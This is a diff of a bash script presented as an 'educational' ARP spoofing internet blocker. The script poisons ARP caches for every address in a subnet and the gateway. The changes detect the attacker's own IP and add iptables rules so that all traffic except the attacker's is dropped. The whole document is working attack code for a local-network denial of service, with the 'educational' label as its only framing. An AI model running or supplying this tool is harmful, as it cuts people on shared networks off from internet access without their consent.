@@ -3,14 +3,20 @@
 # ARP Spoofing Internet Blocker (Educational Purposes Only)
 # Targets all possible IPs in subnet (without scanning)                                                                             # Requires: arpspoof, iptables, ipcalc
 
+echo "Enter the Network Interface (e.g., wlan0):"
+read -p "> " INTERFACE
+
 echo "Enter the Router Gateway IP:"
 read -p "> " GATEWAY
 
+# Detect Device IP
+echo "Enter Device IP: Enter by default"
+IP=$(ip addr show "$INTERFACE" | awk '/inet / {print $2}' | cut -d/ -f1)
+read -p "> $IP" DEVIP
+MYIP="${DEVIP:-$IP}"
+
 echo "Enter the target subnet (e.g., 192.168.1.1/24):"
 read -p "> " TARGET_SUBNET
-
-echo "Enter the Network Interface (e.g., wlan0):"
-read -p "> " INTERFACE
 
 # Enable IP forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -41,10 +47,6 @@ expand_subnet() {
     ipcalc -n -b "$SUBNET" | awk '/HostMin/ {start=$2} /HostMax/ {end=$2} END {if(start && end) print start, end}'
 }
 
-# Block all traffic
-iptables -I FORWARD -i "$INTERFACE" -j DROP
-iptables -I FORWARD -o "$INTERFACE" -j DROP
-
 # Expand subnet for ARP spoofing
 read HOSTMIN HOSTMAX < <(expand_subnet "$TARGET_SUBNET")
 if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
@@ -63,6 +65,10 @@ if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
     for ((i=START; i<=END; i++)); do
         TARGET_IP=$(int2ip $i)
         (
+            # Block all the traffic except the DEVICE IP and GATEWAY
+            iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
+            iptables -I FORWARD ! -d "$GATEWAY" -s "$MYIP" -j DROP
+          
             arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
             arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
         ) &
